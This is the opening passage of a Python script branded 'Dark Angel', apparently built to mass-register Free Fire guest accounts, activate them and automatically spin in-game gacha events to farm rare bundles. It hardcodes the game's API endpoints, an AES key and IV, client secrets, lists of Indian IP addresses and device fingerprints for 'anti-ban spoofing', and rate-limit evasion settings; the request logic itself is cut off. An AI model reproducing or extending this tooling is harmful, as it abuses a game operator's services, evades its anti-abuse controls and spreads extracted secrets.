#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════════════
#   𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑  //  MASTER COMBINED ENGINE  //  v2.0 PREMIUM
#   Owner  : 𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑
#   Brand  : DARK ANGEL OFFICIAL
#   Mode   : TURBO AUTO + SPINNER (5 EVENTS)
#   Region : IND FOCUS 🇮🇳
# ══════════════════════════════════════════════════════════════════════════

import os
import sys
import time
import json
import base64
import random
import string
import codecs
import hmac
import hashlib
import threading
import re
import subprocess
import secrets
import signal
import uuid
import csv
import shutil
import asyncio
from datetime import datetime, timezone
from collections import deque
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from typing import Dict, Optional, List, Any, Tuple

# ══════════════════════════════════════════════════════════════════════════
#  BOOTSTRAP — auto install
# ══════════════════════════════════════════════════════════════════════════
class _Bootstrapper:
    @staticmethod
    def install() -> None:
        required = ['requests', 'pycryptodome', 'colorama', 'aiohttp', 'blackboxprotobuf']
        for pkg in required:
            try:
                if pkg == 'pycryptodome':
                    import Crypto
                elif pkg == 'requests':
                    import requests
                elif pkg == 'colorama':
                    from colorama import Fore, Style, init
                elif pkg == 'aiohttp':
                    import aiohttp
                elif pkg == 'blackboxprotobuf':
                    import blackboxprotobuf
            except ImportError:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', '--no-cache-dir', pkg, '-q'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
        try:
            from colorama import init
            init(autoreset=True)
        except Exception:
            pass


_Bootstrapper.install()

import requests
import urllib3
import aiohttp
import blackboxprotobuf
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Windows UTF-8 fix
if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        os.system("chcp 65001 > nul 2>&1")
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  CREDIT PROTECTION — 𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑
# ══════════════════════════════════════════════════════════════════════════
_OWNER_NAME  = "𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑"
_OWNER_TAG   = "DARK ANGEL OFFICIAL"
_OWNER_VER   = "v2.0 COMBINED PREMIUM"
_OWNER_SIG   = "DARK_ANGEL_SPINNER_2026"
_OWNER_TG    = "@dark_angel_official"


def _verify_credit() -> bool:
    try:
        with open(__file__, "r", encoding="utf-8") as f:
            content = f.read()
        required = [_OWNER_NAME, _OWNER_TAG, _OWNER_VER, _OWNER_SIG]
        for s in required:
            if s not in content:
                return False
        return True
    except Exception:
        return True


def _enforce_credit() -> dict:
    return {
        "owner": _OWNER_NAME,
        "tag":   _OWNER_TAG,
        "tg":    _OWNER_TG,
        "ver":   _OWNER_VER,
    }


def _show_violation():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("  \033[1;91m" + "╔" + "═" * 62 + "╗\033[0m")
    print("  \033[1;91m║\033[0m         \033[1;97m⚠️  CREDIT VIOLATION DETECTED  ⚠️\033[0m                \033[1;91m║\033[0m")
    print("  \033[1;91m╚" + "═" * 62 + "╝\033[0m")
    print()
    print("  \033[1;91m❌ Unauthorized modification detected.\033[0m")
    print()
    print(f"  \033[38;5;220mOwner  : \033[97m{_OWNER_NAME}\033[0m")
    print(f"  \033[38;5;220mTag    : \033[97m{_OWNER_TAG}\033[0m")
    print(f"  \033[38;5;220mTG     : \033[97m{_OWNER_TG}\033[0m")
    print(f"  \033[38;5;220mVersion: \033[97m{_OWNER_VER}\033[0m")
    print()
    print("  \033[38;5;240m" + "━" * 64 + "\033[0m")
    print("  \033[1;91mCredit change karna PROHIBITED hai.\033[0m")
    print("  \033[38;5;240m" + "━" * 64 + "\033[0m")
    print()
    try:
        input("  \033[38;5;240mPress Enter to exit...\033[0m")
    except Exception:
        pass
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════════════
#  COLOR SYSTEM — DARK ANGEL palette (master.py base)
# ══════════════════════════════════════════════════════════════════════════
class NEXUS:
    VOID      = '\033[38;5;16m'
    ABYSS     = '\033[38;5;17m'
    DEEP      = '\033[38;5;18m'
    NIGHT     = '\033[38;5;234m'
    CARBON    = '\033[38;5;235m'
    STEEL     = '\033[38;5;240m'
    ASH       = '\033[38;5;244m'
    SILVER    = '\033[38;5;250m'
    SNOW      = '\033[38;5;255m'
    WHITE     = '\033[38;5;231m'

    CYAN      = '\033[38;5;51m'
    AQUA      = '\033[38;5;45m'
    TEAL      = '\033[38;5;44m'
    MINT      = '\033[38;5;49m'
    LIME      = '\033[38;5;118m'
    GREEN     = '\033[38;5;82m'
    EMERALD   = '\033[38;5;41m'
    JADE      = '\033[38;5;42m'

    AMBER     = '\033[38;5;214m'
    GOLD      = '\033[38;5;220m'
    YELLOW    = '\033[38;5;226m'
    ORANGE    = '\033[38;5;208m'
    CORAL     = '\033[38;5;209m'
    RED       = '\033[38;5;196m'
    CRIMSON   = '\033[38;5;160m'
    ROSE      = '\033[38;5;204m'

    PINK      = '\033[38;5;213m'
    MAGENTA   = '\033[38;5;201m'
    FUCHSIA   = '\033[38;5;200m'
    PURPLE    = '\033[38;5;135m'
    VIOLET    = '\033[38;5;99m'
    INDIGO    = '\033[38;5;63m'
    BLUE      = '\033[38;5;39m'
    SKY       = '\033[38;5;117m'
    ICE       = '\033[38;5;159m'

    BOLD      = '\033[1m'
    DIM       = '\033[2m'
    ITALIC    = '\033[3m'
    UNDER     = '\033[4m'
    BLINK     = '\033[5m'
    REVERSE   = '\033[7m'
    RESET     = '\033[0m'

    # Backgrounds
    BG_RED    = '\033[48;5;196m'
    BG_GOLD   = '\033[48;5;220m'
    BG_BLACK  = '\033[48;5;16m'

    NEON_FLOW  = [CYAN, AQUA, TEAL, MINT, LIME, GREEN, JADE, EMERALD]
    FIRE_FLOW  = [YELLOW, GOLD, AMBER, ORANGE, CORAL, RED, CRIMSON, ROSE]
    ICE_FLOW   = [WHITE, SNOW, ICE, SKY, CYAN, AQUA, BLUE, INDIGO]
    ROYAL_FLOW = [PINK, MAGENTA, FUCHSIA, PURPLE, VIOLET, INDIGO, BLUE, SKY]
    MATRIX     = [GREEN, LIME, MINT, EMERALD, JADE, TEAL, AQUA, CYAN]
    ANGEL_FLOW = [GOLD, CORAL, CRIMSON, RED, CRIMSON, CORAL, GOLD]


# ══════════════════════════════════════════════════════════════════════════
#  CONFIG — DARK ANGEL
# ══════════════════════════════════════════════════════════════════════════
CURRENT_DIR   = os.path.dirname(os.path.abspath(__file__))
RESULT_FOLDER = os.path.join(CURRENT_DIR, "ANGEL_OPERATIONS")
EVENTS_FOLDER = os.path.join(RESULT_FOLDER, "events")
LOGS_FOLDER   = os.path.join(RESULT_FOLDER, "logs")

os.makedirs(RESULT_FOLDER, exist_ok=True)
os.makedirs(EVENTS_FOLDER, exist_ok=True)
os.makedirs(LOGS_FOLDER, exist_ok=True)


class Config:
    ACCOUNTS_FILE           = os.path.join(RESULT_FOLDER, "accounts.json")
    ACTIVATED_FILE          = os.path.join(RESULT_FOLDER, "activated_accounts.json")
    ALL_ITEMS_FILE          = os.path.join(RESULT_FOLDER, "all_items.json")
    ACTIVATION_RESULTS_FILE = os.path.join(RESULT_FOLDER, "activation_results.csv")
    STATS_FILE              = os.path.join(RESULT_FOLDER, "stats.json")
    ERROR_LOG_FILE          = os.path.join(LOGS_FOLDER, "errors.log")

    # API keys (master.py se)
    API_HEX_KEY    = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
    API_SECRET_KEY = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"

    AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    AES_IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

    CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
    APP_ID        = 100067
    RELEASE_VER   = "OB55"
    GAME_VERSION  = "2.132.4"

    # Garena endpoints
    URL_GUEST_REGISTER = "https://100067.connect.garena.com/api/v2/oauth/guest:register"
    URL_TOKEN_GRANT    = "https://100067.connect.garena.com/api/v2/oauth/guest/token:grant"
    URL_MAJOR_LOGIN    = "https://loginbp.ppmainecoonghj.com/MajorLogin"
    URL_MAJOR_REGISTER = "https://loginbp.ppmainecoonghj.com/MajorRegister"
    URL_NEWBIE_CHOICE  = "https://loginbp.ppmainecoonghj.com/ChooseNewbieChoice"
    URL_GETLOGIN_IND   = "https://client.ind.freefiremobile.com/GetLoginData"

    # External activation API (fallback)
    ACTIVATION_API     = "https://rg-act-ofc.vercel.app/jxe/act"
    ACTIVATION_TIMEOUT = 8

    # Region → lang
    REGION_LANG = {
        "BD": "bn", "IND": "hi", "PK": "ur", "SG": "en", "ID": "id",
        "ME": "ar", "CIS": "ru", "TH": "th", "EU": "en", "US": "en",
        "SAC": "es", "LK": "en"
    }

    # TURBO engine
    TURBO_THREADS        = 16
    MAX_THREADS          = 200
    MIN_THREADS          = 1
    ACTIVATION_COOLDOWN  = 0.4
    BATCH_COOLDOWN       = 30.0
    PACE_BETWEEN_EVENTS  = 0.6
    MODE_LABEL           = "TURBO"

    # Spinner tuning
    DEFAULT_WORKERS      = 16
    MIN_WORKERS          = 1
    MAX_WORKERS          = 200
    HTTP_POOL_LIMIT      = 500
    HTTP_POOL_PER_HOST   = 200
    BATCH_SAVE_SIZE      = 20
    BATCH_SAVE_INTERVAL  = 3.0
    PACE_PER_PROXY       = 0.4
    HTTP_TIMEOUT         = (5, 10)

    # Branding
    BRAND            = "𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑"
    BRAND_LONG       = "DARK ANGEL"
    BRAND_TAG        = "DARK ANGEL OFFICIAL"
    CREDIT           = "DARK ANGEL OFFICIAL"
    PASSWORD_PREFIX  = "DARK"
    NICK_PREFIX      = "ANGEL"


# ══════════════════════════════════════════════════════════════════════════
#  EVENTS DATA — 5 PREMIUM EVENTS (IND + सभी regions)
# ══════════════════════════════════════════════════════════════════════════
EVENTS_DATA = {
    "NARUTO_BUNDLE": {
        "display_name": "🎭 Naruto Bundle",
        "payloads": {
            "BD":  "7DF7F8996CD696356CD01BCBD2B3CDE8",
            "IND": "7FCB76B6CB40C0FFD3FBBDDA4600C039",
            "PK":  "7DF7F8996CD696356CD01BCBD2B3CDE8",
            "TH":  "7DF7F8996CD696356CD01BCBD2B3CDE8",
        },
        "rare_ids": [907104746, 909047015],
        "ultra_rare": 710047022,
        "item_ids": {
            710047022: "NARUTO BUNDLE",
            801055004: "NARUTO TOKEN",
            820981015: "BLUE NINJA VOUCHER",
            903047008: "Loot Box - Body Replacement",
            904047008: "Backpack - Ninja Scroll",
            907104746: "Gloo Wall - Hokage Rock",
            909047015: "Rasengan",
        },
        "special_file": "naruto.json",
        "enabled": True,
    },
    "NINJA_RUN_EMOTE": {
        "display_name": "🏃 Ninja Run Emote",
        "payloads": {
            "BD":  "769A31BAAE62A044238945EE9B539D05",
            "IND": "B828468C0B7B44C6F2E3E064A064171A",
            "PK":  "769A31BAAE62A044238945EE9B539D05",
            "TH":  "769A31BAAE62A044238945EE9B539D05",
        },
        "rare_ids": [909047017, 909047016],
        "ultra_rare": 909047018,
        "item_ids": {
            909047016: "Thousand Years of Death",
            909047017: "Ninja Sign",
            909047018: "Ninja Run",
        },
        "special_file": "ninja_run.json",
        "enabled": True,
    },
    "SASUKE_BUNDLE": {
        "display_name": "⚔️ Sasuke Bundle (No Katana)",
        "payloads": {
            "BD":  "EDB8B9562B8F50FD1A5096AE5C2ED3C8",
            "IND": "0491081FFCA49CABBE05A66E7954913F",
            "PK":  "EDB8B9562B8F50FD1A5096AE5C2ED3C8",
            "TH":  "0974C54040C418175BE20BF644D7A029",
        },
        "rare_ids": [907104743, 907104742],
        "ultra_rare": 710047023,
        "item_ids": {
            710047023: "Sasuke Bundle (No Katana)",
            801055002: "Hidden Leaf Token",
            907104742: "Katana - Snake Sword",
            907104743: "Groza - Sasuke Theme",
        },
        "special_file": "sasuke.json",
        "enabled": True,
    },
    "WRATH_NINE_TAILS": {
        "display_name": "🦊 Wrath of the Nine Tails",
        "payloads": {
            "BD":  "E9602B2CA4C09E1D15884AD674ABE65B",
            "IND": "7F8C67F6720CF39448AF9F690D90E1F1",
            "PK":  "E9602B2CA4C09E1D15884AD674ABE65B",
            "TH":  "E9602B2CA4C09E1D15884AD674ABE65B",
        },
        "rare_ids": [],
        "ultra_rare": 912047002,
        "item_ids": {
            912047002: "Wrath of the Nine Tails",
            500000008: "Enhance Hammer",
            801055002: "Hidden Leaf Token",
        },
        "special_file": "wrath_nine.json",
        "enabled": True,
    },
    "DARK_DESIRE_BUNDLE": {
        "display_name": "🌑 Dark Desire Bundle",
        "payloads": {
            "BD":  "3D91D5DF338384E0D1E27505230D1365",
            "IND": "50D8F7E57969BB3C99D45777E6D2FE0B",
            "PK":  "E5DB1CA2E658D7822AF465B83B4A2D2F",
            "TH":  "E5DB1CA2E658D7822AF465B83B4A2D2F",
        },
        "rare_ids": [907105405, 907105450],
        "ultra_rare": 203054011,
        "item_ids": {
            203054011: "DARK DESIRE BUNDLE",
            903054005: "Loot Box - Luxurious Desire",
            907105405: "M82B - Envious Desire",
            907105424: "Katana - Loving Desire",
            907105450: "Gloo Wall - Slothful Desire",
            911005401: "Luxurious Boat",
        },
        "special_file": "dark_desire.json",
        "enabled": True,
    },
}


# ══════════════════════════════════════════════════════════════════════════
#  RARE ITEMS — 5 MAIN BUNDLES (🎉 के लिए)
# ══════════════════════════════════════════════════════════════════════════
RARE_5_ITEMS = {
    710047022: ("🎭 NARUTO BUNDLE",              "NARUTO_BUNDLE"),
    710047023: ("⚔️ Sasuke Bundle (No Katana)",  "SASUKE_BUNDLE"),
    909047018: ("🏃 Ninja Run Emote",            "NINJA_RUN_EMOTE"),
    912047002: ("🦊 Wrath of the Nine Tails",    "WRATH_NINE_TAILS"),
    203054011: ("🌑 DARK DESIRE BUNDLE",         "DARK_DESIRE_BUNDLE"),
}


# ══════════════════════════════════════════════════════════════════════════
#  FULL ITEM DATABASE
# ══════════════════════════════════════════════════════════════════════════
RARE_ITEMS_DB = {
    710047022: "NARUTO BUNDLE",
    801055004: "NARUTO TOKEN",
    820981015: "BLUE NINJA VOUCHER",
    903047008: "Loot Box - Body Replacement",
    904047008: "Backpack - Ninja Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan",
    909047016: "Thousand Years of Death",
    909047017: "Ninja Sign",
    909047018: "Ninja Run",
    710047023: "Sasuke Bundle (No Katana)",
    801055002: "Hidden Leaf Token",
    907104742: "Katana - Snake Sword",
    907104743: "Groza - Sasuke Theme",
    912047002: "Wrath of the Nine Tails",
    500000008: "Enhance Hammer",
    500000005: "Hammer 5",
    500000004: "Hammer 4",
    500000003: "Hammer 3",
    203054011: "DARK DESIRE BUNDLE",
    903054005: "Loot Box - Luxurious Desire",
    907105405: "M82B - Envious Desire",
    907105424: "Katana - Loving Desire",
    907105450: "Gloo Wall - Slothful Desire",
    911005401: "Luxurious Boat",
    400000530: "Warrior Spirit Loot Crate",
    906000094: "Voucher / Token",
    907103120: "Item 907103120",
    407103106: "Item 407103106",
}


# ══════════════════════════════════════════════════════════════════════════
#  REGION URLs (PurchaseGacha)
# ══════════════════════════════════════════════════════════════════════════
REGION_URLS = {
    "BD":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "IND":    "https://client.ind.freefiremobile.com/PurchaseGacha",
    "PK":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "TH":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "SG":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "ID":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "ME":     "https://clientbp.ggpolarbear.com/PurchaseGacha",
    "US":     "https://client.us.freefiremobile.com/PurchaseGacha",
    "BR":     "https://client.us.freefiremobile.com/PurchaseGacha",
    "NA":     "https://client.us.freefiremobile.com/PurchaseGacha",
    "SAC":    "https://client.us.freefiremobile.com/PurchaseGacha",
}


# ══════════════════════════════════════════════════════════════════════════
#  INDIAN IPs (anti-ban spoofing)
# ══════════════════════════════════════════════════════════════════════════
INDIAN_IPS = [
    "49.36.180.10", "49.36.180.22", "49.36.181.15", "49.36.181.30",
    "103.87.24.10", "103.87.24.25", "103.87.25.14", "103.87.25.30",
    "115.99.10.20", "115.99.10.35", "115.99.11.40", "115.99.11.55",
    "49.36.83.10",  "49.36.83.22",  "49.36.84.15",  "49.36.84.30",
    "103.25.12.10", "103.25.12.25", "103.25.13.14", "103.25.13.30",
    "115.99.20.10", "115.99.20.22", "115.99.21.15", "115.99.21.30",
    "49.36.100.10", "49.36.100.22","49.36.101.15", "49.36.101.30",
    "103.41.20.10", "103.41.20.20", "103.41.21.10", "103.41.21.20",
    "115.99.30.10", "115.99.30.22", "115.99.31.15", "115.99.31.30",
    "49.36.150.10", "49.36.150.22","49.36.151.15", "49.36.151.30",
]


# ══════════════════════════════════════════════════════════════════════════
#  DEVICES (device fingerprint spoofing)
# ══════════════════════════════════════════════════════════════════════════
DEVICES = [
    ("Asus ASUS_AI2501_B",  "Android OS 12 / API-31 (SP1A.210812.016.C2)", "Adreno (TM) 640",  "OpenGL ES 3.2"),
    ("Redmi Note 12 Pro",   "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 618",  "OpenGL ES 3.2"),
    ("Samsung SM-M135F",    "Android OS 13 / API-33 (TP1A.220624.014)",   "Mali-G68",         "OpenGL ES 3.2"),
    ("Realme RMX3630",      "Android OS 12 / API-31 (SP1A.210812.016)",   "Adreno (TM) 610",  "OpenGL ES 3.2"),
    ("Vivo V2149",          "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 642L", "OpenGL ES 3.2"),
    ("OnePlus CPH2411",     "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 730",  "OpenGL ES 3.2"),
    ("Poco M4 Pro 5G",      "Android OS 12 / API-31 (SP1A.210812.016)",   "Mali-G57 MC2",     "OpenGL ES 3.2"),
    ("iQOO I2012",          "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 650",  "OpenGL ES 3.2"),
    ("Oppo CPH2477",        "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 619",  "OpenGL ES 3.2"),
    ("Tecno KI8",           "Android OS 13 / API-33 (TP1A.220624.014)",   "Mali-G57",         "OpenGL ES 3.2"),
    ("Infinix X6819",       "Android OS 12 / API-31 (SP1A.210812.016)",   "Mali-G52 MC2",     "OpenGL ES 3.2"),
    ("Motorola moto g73",   "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 619",  "OpenGL ES 3.2"),
    ("Xiaomi 2201122G",     "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 730",  "OpenGL ES 3.2"),
    ("Realme RMX3700",      "Android OS 14 / API-34 (UP1A.231005.007)",   "Mali-G710",        "OpenGL ES 3.2"),
    ("OnePlus CPH2451",     "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 740",  "OpenGL ES 3.2"),
    ("OPPO CPH2611",        "Android OS 14 / API-34 (UP1A.231005.007)",   "Adreno (TM) 720",  "OpenGL ES 3.2"),
    ("Samsung SM-G998B",    "Android OS 12 / API-31 (SP1A.210812.016)",   "Adreno (TM) 660",  "OpenGL ES 3.2"),
    ("Poco M2102J20SG",     "Android OS 13 / API-33 (TP1A.220624.014)",   "Adreno (TM) 660",  "OpenGL ES 3.2"),
    ("Vivo V2203",          "Android OS 12 / API-31 (SP1A.210812.016)",   "Mali-G710",        "OpenGL ES 3.2"),
    ("Xiaomi 2201117TG",    "Android OS 12 / API-31 (SP1A.210812.016)",   "Adreno (TM) 618",  "OpenGL ES 3.2"),
]


# ══════════════════════════════════════════════════════════════════════════
#  USER AGENTS (master.py se)
# ══════════════════════════════════════════════════════════════════════════
USER_AGENTS = [
    "GarenaMSDK/4.0.44(25028RN03A ;Android 15;ar;EG;app 1.132.1 2019121229;)",
    "GarenaMSDK/4.0.43(25028RN03A ;Android 14;en;IN;app 1.131.1 2019121229;)",
    "GarenaMSDK/4.0.45(25028RN03A ;Android 13;hi;IN;app 1.133.1 2019121229;)",
    "GarenaMSDK/4.0.42(25028RN03A ;Android 12;en;IN;app 1.130.1 2019121229;)",
    "GarenaMSDK/4.0.41(25028RN03A ;Android 11;hi;IN;app 1.129.1 2019121229;)",
    "GarenaMSDK/4.0.40(25028RN03A ;Android 10;en;IN;app 1.128.1 2019121229;)",
]


# ══════════════════════════════════════════════════════════════════════════
#  ANTI-BAN CONFIG
# ══════════════════════════════════════════════════════════════════════════
ANTI_BAN = {
    "enable_random_ip":       True,
    "enable_random_device":   True,
    "enable_proxy":           True,
    "enable_external_jwt":    False,
    "min_request_gap":        0.35,
    "max_request_gap":        0.65,
    "account_gap":            3.0,
    "batch_cooldown":         30.0,
    "max_retries":            2,
    "cooldown_429":           20.0,
    "cooldown_503":           45.0,
    "cooldown_403":           60.0,
    "enable_smart_pacing":    True,
    "enable_error_log":       True,
}


# ══════════════════════════════════════════════════════════════════════════
#  GLOBAL STATE (master.py + spinner state)
# ══════════════════════════════════════════════════════════════════════════
class AppState:
    def __init__(self):
        # Generator/Activator state
        self.exit_flag            = False
        self.success_count        = 0
        self.activated_count      = 0
        self.lock                 = threading.Lock()
        self.print_lock           = threading.Lock()
        self.ip_counter           = 0
        self.ip_lock              = threading.Lock()
        self.proxy_list: List[str] = []
        self.activation_lock      = threading.Lock()
        self.last_activation_time = 0.0
        self.results_lock         = threading.Lock()
        self.activation_results: List[List[str]] = []
        self._anim_stop           = threading.Event()

        # Spinner state
        self.stop_flag            = threading.Event()
        self.total_spins          = 0
        self.total_special        = 0
        self.total_errors         = 0
        self.session_start        = time.time()

        # File locks
        self.file_lock            = threading.Lock()
        self.stats_lock           = threading.Lock()
        self.counter_lock         = threading.Lock()


state = AppState()

# Global counters (spinner ke liye)
TOTAL_SPINS     = 0
TOTAL_SPECIAL   = 0
TOTAL_ERRORS    = 0
TOTAL_GENERATED = 0
TOTAL_ACTIVATED = 0
START_TIME      = time.time()


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 1 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 2 — PRINT HELPERS, ANIMATION, TERMINAL, BANNER, UI
# ══════════════════════════════════════════════════════════════════════════

import shutil as _shutil


# ══════════════════════════════════════════════════════════════════════════
#  SAFE PRINT (thread-safe + encoding fallback)
# ══════════════════════════════════════════════════════════════════════════
def _safe_print(text: str):
    with state.print_lock:
        try:
            print(text, flush=True)
        except UnicodeEncodeError:
            try:
                print(text.encode('ascii', errors='replace').decode('ascii'), flush=True)
            except Exception:
                pass
        except Exception:
            pass


def _ts() -> str:
    return f"{NEXUS.STEEL}[{time.strftime('%H:%M:%S')}]{NEXUS.RESET}"


def log_ok(msg: str):
    _safe_print(f"{_ts()} {NEXUS.LIME}✅{NEXUS.RESET} {NEXUS.GREEN}{msg}{NEXUS.RESET}")


def log_err(msg: str):
    _safe_print(f"{_ts()} {NEXUS.RED}❌{NEXUS.RESET} {NEXUS.CORAL}{msg}{NEXUS.RESET}")


def log_info(msg: str):
    _safe_print(f"{_ts()} {NEXUS.CYAN}ℹ️ {NEXUS.RESET} {NEXUS.AQUA}{msg}{NEXUS.RESET}")


def log_warn(msg: str):
    _safe_print(f"{_ts()} {NEXUS.YELLOW}⚠️ {NEXUS.RESET} {NEXUS.AMBER}{msg}{NEXUS.RESET}")


def log_spin(msg: str):
    _safe_print(f"{_ts()} {NEXUS.MAGENTA}🎰{NEXUS.RESET} {NEXUS.FUCHSIA}{msg}{NEXUS.RESET}")


def log_angel(msg: str):
    _safe_print(f"{_ts()} {NEXUS.GOLD}👑{NEXUS.RESET} {NEXUS.YELLOW}{msg}{NEXUS.RESET}")


def log_special(msg: str):
    _safe_print(f"{_ts()} {NEXUS.YELLOW}🎁{NEXUS.RESET} {NEXUS.GOLD}{NEXUS.BOLD}{msg}{NEXUS.RESET}")


def log_ind(msg: str):
    _safe_print(f"{_ts()} {NEXUS.ORANGE}🇮🇳{NEXUS.RESET} {NEXUS.GOLD}{msg}{NEXUS.RESET}")


def log_gen(msg: str):
    _safe_print(f"{_ts()} {NEXUS.CYAN}🎮{NEXUS.RESET} {NEXUS.LIME}{msg}{NEXUS.RESET}")


def log_act(msg: str):
    _safe_print(f"{_ts()} {NEXUS.MAGENTA}⚡{NEXUS.RESET} {NEXUS.PINK}{msg}{NEXUS.RESET}")


def log_error_to_file(error_msg: str, context: str = ""):
    if not ANTI_BAN.get("enable_error_log", True):
        return
    try:
        with state.file_lock:
            with open(Config.ERROR_LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {context}: {error_msg}\n")
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  ANSI-SAFE LENGTH (emoji safe)
# ══════════════════════════════════════════════════════════════════════════
_ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')


def _vlen(text: str) -> int:
    """Visible length ignoring ANSI codes — emoji safe"""
    text = _ANSI_RE.sub("", text)
    length = 0
    for ch in text:
        cp = ord(ch)
        if (0x1F300 <= cp <= 0x1F9FF or
            0x1F000 <= cp <= 0x1F2FF or
            0x2600 <= cp <= 0x27BF or
            0x2500 <= cp <= 0x257F or
            0x1F600 <= cp <= 0x1F64F or
            0x1F680 <= cp <= 0x1F6FF):
            length += 2
        else:
            length += 1
    return length


def _pad_visible(s: str, width: int) -> str:
    visible = _vlen(s)
    return s + " " * max(0, width - visible)


# ══════════════════════════════════════════════════════════════════════════
#  GRADIENT HELPERS
# ══════════════════════════════════════════════════════════════════════════
def gradient_text(text: str, palette: list, offset: int = 0) -> str:
    out = []
    for i, ch in enumerate(text):
        if ch == " " or ch == "\n":
            out.append(ch)
        else:
            color = palette[(i + offset) % len(palette)]
            out.append(f"{color}{ch}")
    return "".join(out) + NEXUS.RESET


def rainbow_border(width: int, palette: list, char: str = "─") -> str:
    return "".join(f"{palette[i % len(palette)]}{char}" for i in range(width)) + NEXUS.RESET


def angel_border(width: int, char: str = "═") -> str:
    return rainbow_border(width, NEXUS.ANGEL_FLOW, char)


def typewriter_gradient(text: str, palette: list, delay: float = 0.003, prefix: str = "  "):
    sys.stdout.write(prefix + NEXUS.BOLD)
    for i, ch in enumerate(text):
        color = palette[i % len(palette)]
        sys.stdout.write(f"{color}{ch}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(f"{NEXUS.RESET}\n")


# ══════════════════════════════════════════════════════════════════════════
#  TIME HELPERS
# ══════════════════════════════════════════════════════════════════════════
def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def format_duration(seconds: float) -> str:
    seconds = max(0, int(seconds))
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    if h > 0:
        return f"{h}h {m:02d}m {s:02d}s"
    elif m > 0:
        return f"{m}m {s:02d}s"
    else:
        return f"{s}s"


# ══════════════════════════════════════════════════════════════════════════
#  ANIMATION ENGINE
# ══════════════════════════════════════════════════════════════════════════
class Anim:
    SPINNER = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    BLOCKS  = "▁▂▃▄▅▆▇█▇▆▅▄▃▂"
    PULSE   = ["●", "◉", "○", "◌"]
    ARROWS  = "←↑→↓"
    DOTS    = "⣾⣽⣻⢿⡿⣟⣯⣷"
    BARS    = "▏▎▍▌▋▊▉█"

    @staticmethod
    def gradient(text: str, palette: list, offset: int = 0) -> str:
        out = []
        for i, ch in enumerate(text):
            if ch == " ":
                out.append(ch)
                continue
            color = palette[(i + offset) % len(palette)]
            out.append(f"{color}{ch}")
        return "".join(out) + NEXUS.RESET

    @staticmethod
    def typewriter(text: str, color: str = NEXUS.CYAN, delay: float = 0.012) -> None:
        for ch in text:
            sys.stdout.write(f"{color}{ch}{NEXUS.RESET}")
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write("\n")

    @staticmethod
    def spinner(text: str, duration: float = 1.2, color: str = NEXUS.CYAN) -> None:
        frames = max(1, int(duration * 24))
        for i in range(frames):
            sys.stdout.write(f"\r{color}{Anim.DOTS[i % len(Anim.DOTS)]}{NEXUS.RESET} {NEXUS.SILVER}{text}{NEXUS.RESET}")
            sys.stdout.flush()
            time.sleep(1.0 / 24)
        sys.stdout.write("\r" + " " * (len(text) + 4) + "\r")

    @staticmethod
    def glitch(text: str, color: str = NEXUS.RED, duration: float = 0.6) -> None:
        chars = "!@#$%^&*()_+{}[]|;:,.<>?"
        frames = max(1, int(duration * 30))
        for _ in range(frames):
            scrambled = "".join(
                random.choice(chars) if random.random() < 0.3 else ch
                for ch in text
            )
            sys.stdout.write(f"\r{color}{scrambled}{NEXUS.RESET}")
            sys.stdout.flush()
            time.sleep(0.03)
        sys.stdout.write(f"\r{NEXUS.BOLD}{NEXUS.WHITE}{text}{NEXUS.RESET}\n")

    @staticmethod
    def loading_bar(text: str, duration: float = 1.0, width: int = 28) -> None:
        total = max(1, int(duration * 15))
        try:
